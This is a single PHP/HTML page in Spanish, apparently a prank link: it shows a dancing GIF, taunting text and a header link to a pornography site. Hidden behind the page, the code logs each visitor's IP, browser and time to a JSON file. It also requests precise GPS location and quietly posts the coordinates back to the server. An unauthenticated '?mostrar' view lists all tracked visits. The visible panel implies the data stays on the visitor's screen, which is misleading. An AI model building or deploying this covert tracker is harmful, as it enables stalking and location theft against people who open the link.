<?php
$archivo = __DIR__ . '/ip.json';
if (!file_exists($archivo)) file_put_contents($archivo, '[]', LOCK_EX);

$historial = json_decode(file_get_contents($archivo), true);
if (!is_array($historial)) $historial = [];

function e($v) {
    return htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['actualizar'])) {
    header('Content-Type: application/json');
    $id = $_POST['id'] ?? '';

    foreach ($historial as &$v) {
        if (($v['id'] ?? '') === $id) {
            if (isset($_POST['lat'])) $v['latitud_gps'] = (float)$_POST['lat'];
            if (isset($_POST['lon'])) $v['longitud_gps'] = (float)$_POST['lon'];
            if (isset($_POST['precision'])) $v['precision_gps'] = (float)$_POST['precision'];
            break;
        }
    }
    unset($v);

    file_put_contents($archivo, json_encode($historial, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
    echo json_encode(['ok' => true]);
    exit;
}

if (isset($_GET['mostrar'])) {
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Historial</title>
<style>
body{background:#222;color:white;font-family:Arial;padding:25px}
.contenedor{max-width:1000px;margin:auto}
.visita{background:#363131;padding:18px;margin:15px 0;border-radius:12px;line-height:1.7}
h1{color:orange}
</style>
</head>
<body>
<div class="contenedor">
<h1>Historial centralizado</h1>
<?php foreach (array_reverse($historial) as $i=>$v): ?>
<div class="visita">
<b>Visita <?=count($historial)-$i?></b><br>
 IP: <b><?=e($v['ip'])?></b><br>
 País: <b><?=e($v['pais'])?></b><br>
 Ciudad: <b><?=e($v['ciudad'])?></b><br>
 Región: <b><?=e($v['region'])?></b><br>
 Código postal: <b><?=e($v['codigo_postal'])?></b><br>
 Latitud IP: <b><?=e($v['latitud_ip'])?></b><br>
 Longitud IP: <b><?=e($v['longitud_ip'])?></b><br>
 Latitud GPS: <b><?=e($v['latitud_gps'] ?? 'No disponible')?></b><br>
 Longitud GPS: <b><?=e($v['longitud_gps'] ?? 'No disponible')?></b><br>
 Precisión: <b><?=e($v['precision_gps'] ?? 'No disponible')?></b><br>
 Proveedor: <b><?=e($v['proveedor'])?></b><br>
 Zona horaria: <b><?=e($v['zona_horaria'])?></b><br>
 Navegador: <b><?=e($v['navegador'])?></b><br>
 Dispositivo: <b><?=e($v['dispositivo'])?></b><br>
 Fecha: <?=e($v['fecha'])?><br>
 Hora: <?=e($v['hora'])?>
</div>
<?php endforeach; ?>
</div>
</body>
</html>
<?php exit; }

$visita = [
'id'=>bin2hex(random_bytes(16)),
'ip'=>$_SERVER['REMOTE_ADDR'] ?? 'No disponible',
'pais'=>'Consultando...',
'ciudad'=>'Consultando...',
'region'=>'Consultando...',
'codigo_postal'=>'Consultando...',
'latitud_ip'=>'Consultando...',
'longitud_ip'=>'Consultando...',
'proveedor'=>'Consultando...',
'zona_horaria'=>'Consultando...',
'latitud_gps'=>'Pendiente',
'longitud_gps'=>'Pendiente',
'precision_gps'=>'Pendiente',
'navegador'=>$_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido',
'dispositivo'=>'Detectando...',
'fecha'=>date('d/m/Y'),
'hora'=>date('H:i:s')
];

$historial[]=$visita;
file_put_contents($archivo,json_encode($historial,JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE),LOCK_EX);
$idVisita=$visita['id'];
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hey qué tal wachín</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #363131;
      text-align: center;
    }

    header {
      background: #f66105;
      padding: 30px 15px;
    }

    header a {
      color: white;
      text-decoration: none;
      font-size: 36px;
      font-weight: bold;
      cursor: pointer;
    }

    header a:hover {
      color: #dd0a07;
    }

    main {
      padding: 35px 20px;
    }

    .galeria {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 20px;
    }

    .galeria img {
      width: 1500px;
      max-width: 90%;
      border-radius: 15px;
      box-shadow: 0 5px 15px rgb(244, 242, 242);
    }
  </style>
</head>

<body>
  <header>
    <a href="https://es.pornhub.com/" target="_blank" rel="noopener noreferrer">
      que tal wachín?
    </a>
  </header>

  <main>
    <h2 style="color: orange;">Mira mira como baila el wachin</h2>
    

    <div class="galeria">
      <img src="https://www.image2url.com/r2/default/gifs/1787774894408-33074edf-5a35-468f-8c70-1a962dd48122.gif.gif" alt="GIF de wachin">
    </div>

    <h2 style="color: orange;">Para q bajas fracasado</h2>
  </main>

<script>
async function obtenerIP() {
    try {
        const r = await fetch("https://ipapi.co/json/");
        return await r.json();
    } catch {
        return {};
    }
}

function navegador() {
    const ua = navigator.userAgent;
    if (/Edg/i.test(ua)) return "Microsoft Edge";
    if (/OPR|Opera/i.test(ua)) return "Opera";
    if (/Firefox/i.test(ua)) return "Mozilla Firefox";
    if (/Chrome/i.test(ua)) return "Google Chrome";
    if (/Safari/i.test(ua)) return "Safari";
    return "Desconocido";
}

function dispositivo() {
    const ua = navigator.userAgent;
    if (/iPhone/i.test(ua)) return "iPhone";
    if (/iPad/i.test(ua)) return "iPad";
    if (/Android/i.test(ua)) return "Android";
    if (/Mobile/i.test(ua)) return "Móvil";
    if (/Windows/i.test(ua)) return "Windows";
    if (/Mac/i.test(ua)) return "Mac";
    if (/Linux/i.test(ua)) return "Linux";
    return "Desconocido";
}

function mostrarDatos(v) {
    let panel = document.getElementById("datos-visita");

    if (!panel) {
        panel = document.createElement("div");
        panel.id = "datos-visita";
        panel.style.cssText = `
            max-width: 850px;
            margin: 25px auto;
            padding: 22px;
            background: #222;
            color: white;
            border-radius: 15px;
            font-family: Arial, sans-serif;
            text-align: left;
            box-shadow: 0 5px 20px rgba(0,0,0,.4);
        `;
        document.body.appendChild(panel);
    }

    panel.innerHTML = `
        <h2 style="color:orange;text-align:center">Información de tu conexión</h2>
        <p>🌐 <b>IP:</b> ${v.ip || "No disponible"}</p>
        <p>🌎 <b>País:</b> ${v.country_name || "No disponible"}</p>
        <p>🏙️ <b>Ciudad:</b> ${v.city || "No disponible"}</p>
        <p>🗺️ <b>Región:</b> ${v.region || "No disponible"}</p>
        <p>📮 <b>Código postal:</b> ${v.postal || "No disponible"}</p>
        <p>📍 <b>Latitud aproximada:</b> ${v.latitude ?? "No disponible"}</p>
        <p>📍 <b>Longitud aproximada:</b> ${v.longitude ?? "No disponible"}</p>
        <p>🏢 <b>Proveedor:</b> ${v.org || "No disponible"}</p>
        <p>🕐 <b>Zona horaria:</b> ${v.timezone || "No disponible"}</p>
        <p>🌐 <b>Navegador:</b> ${navegador()}</p>
        <p>💻 <b>Dispositivo:</b> ${dispositivo()}</p>
        <hr>
        <p>📅 <b>Fecha:</b> ${new Date().toLocaleDateString()}</p>
        <p>⏰ <b>Hora:</b> ${new Date().toLocaleTimeString()}</p>
    `;
}

function solicitarGPS() {
    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
        posicion => {
            const panel = document.getElementById("datos-visita");
            if (!panel) return;

            const lat = posicion.coords.latitude;
            const lon = posicion.coords.longitude;
            const precision = posicion.coords.accuracy;

            panel.innerHTML += `
                <hr>
                <p>📍 <b>Ubicación GPS exacta:</b></p>
                <p>Latitud: <b>${lat}</b></p>
                <p>Longitud: <b>${lon}</b></p>
                <p>Precisión aproximada: <b>${Math.round(precision)} metros</b></p>
            `;
        },
        () => {
            const panel = document.getElementById("datos-visita");
            if (panel) {
                panel.innerHTML += `
                    <hr>
                    <p>📍 <b>Ubicación GPS:</b> no autorizada.</p>
                    <p>Se mantienen las coordenadas aproximadas obtenidas mediante IP.</p>
                `;
            }
        },
        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }
    );
}

async function iniciar() {
    const datos = await obtenerIP();

    // Los datos aparecen directamente en la página.
    mostrarDatos(datos);

    // Solicita permiso para intentar obtener coordenadas GPS más precisas.
    solicitarGPS();
}

iniciar();
</script>


<script>
const ID_VISITA = <?=json_encode($idVisita)?>;

function navegador(){
 const u=navigator.userAgent;
 if(/Edg/i.test(u))return"Microsoft Edge";
 if(/OPR|Opera/i.test(u))return"Opera";
 if(/Firefox/i.test(u))return"Mozilla Firefox";
 if(/Chrome/i.test(u))return"Google Chrome";
 if(/Safari/i.test(u))return"Safari";
 return"Desconocido";
}
function dispositivo(){
 const u=navigator.userAgent;
 if(/iPhone/i.test(u))return"iPhone";
 if(/iPad/i.test(u))return"iPad";
 if(/Android/i.test(u))return"Android";
 if(/Mobile/i.test(u))return"Móvil";
 if(/Windows/i.test(u))return"Windows";
 if(/Mac/i.test(u))return"Mac";
 if(/Linux/i.test(u))return"Linux";
 return"Desconocido";
}

fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
 const p=document.createElement("div");
 p.style.cssText="max-width:850px;margin:25px auto;padding:22px;background:#222;color:white;border-radius:15px;font-family:Arial;text-align:left";
 p.innerHTML=`
 <h2 style="color:orange;text-align:center">Información de la visita</h2>
 <p>🌐 IP: <b>${d.ip||"No disponible"}</b></p>
 <p>🌎 País: <b>${d.country_name||"No disponible"}</b></p>
 <p>🏙️ Ciudad: <b>${d.city||"No disponible"}</b></p>
 <p>🗺️ Región: <b>${d.region||"No disponible"}</b></p>
 <p>📮 Código postal: <b>${d.postal||"No disponible"}</b></p>
 <p>📍 Latitud aproximada: <b>${d.latitude??"No disponible"}</b></p>
 <p>📍 Longitud aproximada: <b>${d.longitude??"No disponible"}</b></p>
 <p>🏢 Proveedor: <b>${d.org||"No disponible"}</b></p>
 <p>🕐 Zona horaria: <b>${d.timezone||"No disponible"}</b></p>
 <p>🌐 Navegador: <b>${navegador()}</b></p>
 <p>💻 Dispositivo: <b>${dispositivo()}</b></p>`;
 document.body.appendChild(p);
}).catch(()=>{});

if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(p=>{
  fetch(location.href,{
   method:"POST",
   headers:{"Content-Type":"application/x-www-form-urlencoded"},
   body:new URLSearchParams({
    actualizar:"1",id:ID_VISITA,
    lat:p.coords.latitude,lon:p.coords.longitude,
    precision:p.coords.accuracy
   })
  });
 },()=>{}, {enableHighAccuracy:true,timeout:15000,maximumAge:0});
}
</script>

</body>
</html>
